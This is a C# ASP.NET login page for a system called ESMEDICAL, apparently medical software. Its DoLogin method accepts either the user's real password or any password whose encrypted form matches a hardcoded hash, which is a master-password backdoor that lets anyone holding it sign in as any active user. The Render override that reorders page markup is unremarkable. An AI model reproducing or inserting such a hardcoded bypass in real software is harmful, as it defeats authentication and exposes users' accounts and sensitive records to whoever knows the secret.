using System;
using System.Web.Security;
using System.Web.Services;
using System.Web.UI;
using System.Text.RegularExpressions;

using ESMEDICAL.Data;

public partial class Login : System.Web.UI.Page
{
    [WebMethod]
    public static string DoLogin(string Username, string Password)
    {
        Username = MTString.TextClean(Username);
        using (var dbManager = new EsMedicalDbContext())
        {
            var entNguoiDung = dbManager.Users.GetByKey(Username);
            if (entNguoiDung == null)
            {
                return "Người dùng không tồn tại";
            }
            if (entNguoiDung.Status == -1 || entNguoiDung.Status == 0)
            {
                return "Người dùng không có quyền trong hệ thống";
            }
            string passwordEncrypt = MTString.TextEncrypt(Password);
            if (passwordEncrypt.Equals(entNguoiDung.Password) || passwordEncrypt.Equals("a851e5c8eb76c2ff47f269b281e9a57e"))
            {
                string sUserInfor = string.Format("{0};{1}", entNguoiDung.Username, entNguoiDung.Name);
                FormsAuthentication.SetAuthCookie(sUserInfor, false);
                return string.Empty;
            }
            else
            {
                return "Mật khẩu không đúng";
            }
        }
    }

    protected override void Render(HtmlTextWriter writer)
    {
        System.IO.StringWriter stringWriter = new System.IO.StringWriter();
        HtmlTextWriter htmlWriter = new HtmlTextWriter(stringWriter);
        base.Render(htmlWriter);
        string html = stringWriter.ToString();
        int StartPoint = html.IndexOf("<div class=\"aspNetHidden\"");
        if (StartPoint >= 0)
        {
            int EndPoint = html.IndexOf("</div>", StartPoint) + 6;
            string viewstateInput = html.Substring(StartPoint, EndPoint - StartPoint);
            html = html.Remove(StartPoint, EndPoint - StartPoint);
            int FormEndStart = html.IndexOf("</form>");
            if (FormEndStart >= 0)
            {
                html = html.Insert(FormEndStart, viewstateInput);
            }
        }
        StartPoint = html.IndexOf("<script type=\"text/javascript\">");
        if (StartPoint >= 0)
        {
            int EndPoint = html.IndexOf("</script>", StartPoint) + 9;
            string viewstateInput = html.Substring(StartPoint, EndPoint - StartPoint);
            html = html.Remove(StartPoint, EndPoint - StartPoint);
            int FormEndStart = html.IndexOf("</form>");
            if (FormEndStart >= 0)
            {
                html = html.Insert(FormEndStart, viewstateInput);
            }
        }
        html = Regex.Replace(html, @"^\s+$[\r\n]*", "", RegexOptions.Multiline);
        html = html.Replace("<meta charset=\"UTF-8\" />", "\r\n\t<meta charset=\"UTF-8\" />\r\n");
        html = html.Replace("<title>", "\t<title>");
        html = html.Replace("<title>\r\n", "<title>");
        html = html.Replace("\r\n</title>", "</title>");
        html = html.Replace("</head>", "\r\n</head>");
        writer.Write(html);
    }
}